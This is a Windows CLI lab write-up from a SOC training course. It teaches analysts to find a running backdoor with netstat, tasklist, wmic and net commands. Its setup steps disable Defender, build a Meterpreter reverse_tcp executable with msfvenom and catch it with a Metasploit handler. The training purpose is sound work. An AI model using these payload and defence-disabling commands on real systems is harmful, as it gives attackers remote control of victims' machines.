---
tags:
  - linux
  - malware-analysis
  - reverse-engineering
  - live-windows-forensics
  - lab-soc-core-skills
date: Feb 07, 2024
---

## Windows CLI

> _Disclaimer: The content, procedures, and materials provided in this lab are strictly for educational purposes. Any information acquired is intended solely for advancing knowledge in cybersecurity. All procedures outlined in this lab, along with the VM utilized, were developed and acquired from the [SOC Core Skills](https://www.antisyphontraining.com/on-demand-courses/soc-core-skills-w-john-strand/) course instructed by [John Strand](https://www.sans.org/profiles/john-strand/). It is emphasized that the knowledge gained here will not be applied for any unauthorized or malicious activities._

> In this lab, we'll explore essential Windows CLI commands vital for SOC and security analysts. We'll create malware, execute it, and utilize tools to examine live system attacks. Hands-on experience is one of the most effective ways to learn, making this process ideal for gaining insights into real malware scenarios.

---

Let's get started.

Let’s get started by opening a Terminal as Administrator

When you get the User Account Control Prompt, select Yes.

In the default powershell Window that opens, lets ensure that Defender is off;

PS C:\Users\adhd> `Set-MpPreference -DisableRealtimeMonitoring $true`

Please note, if you get red errors that say ` A general error occurred that is not covered by a more specific error code.` that is OK!  It means Defender was disabled.  We run above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...

![](_attachments/Pasted%20image%2020240211023639.png)

And now, open a Ubuntu command prompt:

On your Linux system, please run the following command:

`ifconfig`

![](_attachments/Pasted%20image%2020240211023701.png)

Please note the IP address of your Ethernet adapter. 

Please note that my adapter is called eth0 and my IP address is 172.17.32.119.   

Your IP Address and adapter name may be different.

Please note your IP address for the ADHD Linux system on a piece of paper:

Now, run the following commands to start a simple backdoor and backdoor listener: 

`sudo su -`
Please note, the adhd password is adhd.

`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 -f exe -o /tmp/TrustMe.exe`

![](_attachments/Pasted%20image%2020240211023810.png)

`cd /tmp`

`ls -l TrustMe.exe`

`cp ./TrustMe.exe /mnt/c/tools`

![](_attachments/Pasted%20image%2020240211023841.png)

Now, let's start the Metasploit Handler.  You will have to open another Ubuntu command prompt by selecting the down carrot from the upper tabs on the Windows Terminal and selecting Ubuntu.

Let's become root first!!!
`sudo su -`

Now, let's start the Metasploit handler.

root@DESKTOP-I1T2G01:/tmp/# `msfconsole -q`

msf5 > `use exploit/multi/handler`

msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`

PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > `set LHOST <YOUR LINUX IP>`

Remember, your IP will be different!

msf5 exploit(multi/handler) > `exploit`


It should look like this:

![](_attachments/Pasted%20image%2020240211023904.png)

Now, let's open a Windows command prompt.  Simply select the down carrot from the Windows Terminal and select Command Prompt.

Once the prompt is open, let's run the following commands to copy over and run the TrustMe.exe file.

`cd \tools`

Then, run it.

`TrustMe.exe`

Back at your Ubuntu prompt, you should have a metasploit session.

![](_attachments/Pasted%20image%2020240211023920.png)

Now, let's look at the malware from the other side through the Windows commandline slides!

Please, remember, your IP address will be different!!! 

Now, let's open another Command Prompt from our Terminal:

6

Once we are in, lets start with looking at the network connections:

First, let's create a share

`net share class=C:\Tools`

Now, let's look at that share

`net view \\127.0.0.1`

Next, let's create some sessions

`net use * \\127.0.0.1\c$`


We can see those sessions with... 

`net session`

And...

`net use`

It should all look like this:

![](_attachments/Pasted%20image%2020240211023939.png)


While there is not much here for this lab, it is key to remember that these two commands would help us detect an attacker that is mounting shares on other computers (net view) and would tell us an attacker had mounted a share on this system (net session). 

However, we are not done with network connections yet.  Lets try looking at our malware!

`netstat -naob`

![](_attachments/Pasted%20image%2020240211023958.png)

Well, that is a lot of data. This is showing us what ports are open on this system (0.0.0.0:portnumber) or (LISTENING) and what remote connections are made to other systems (ESTABLISHED).  In this example, we are really interested in the ESTABLISHED connections:

![](_attachments/Pasted%20image%2020240211024018.png)

Specificly, we are interested in the connection on port 4444 as we know this is the port we used for our malware.

Now, let's drill down on that connection with some more data:

`netstat -f`

I like to run -f with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 

![](_attachments/Pasted%20image%2020240211024036.png)

But, we do see our last connection with the port 4444.

Let's get the Process ID (PID) so we can dig deeper:

`netstat -naob`

![](_attachments/Pasted%20image%2020240211024053.png)

We can see in the above screenshot that we have the PID.

Now, let's dive in!

First we will start with tasklist  

`tasklist /m /fi "pid eq <PID>"`

Your PID WILL BE DIFFERENT!

![](_attachments/Pasted%20image%2020240211024111.png)

We can see the loaded DLL's above.  As we can see, there is not a whole lot to see here:

Let's keep digging with wmic:

`wmic process where processid=<PID> get commandline`

![](_attachments/Pasted%20image%2020240211024128.png)

Ahh!!  Now we can see that the file was launched from the commandline!  We know this because there are no options.


Let's see if we can see what spawned the process with wmic.

`wmic process get name,parentprocessid,processid`

You can also use a find command to help search for your process ID!

![](_attachments/Pasted%20image%2020240211024152.png)

Above we can see that we hunted the malicious process, then found its parent process ID, then did a find on that process ID.  As you can see above, it was launched by the cmd.exe process.  Also note that the search we just did may turn up some other things launched by the command line as well.
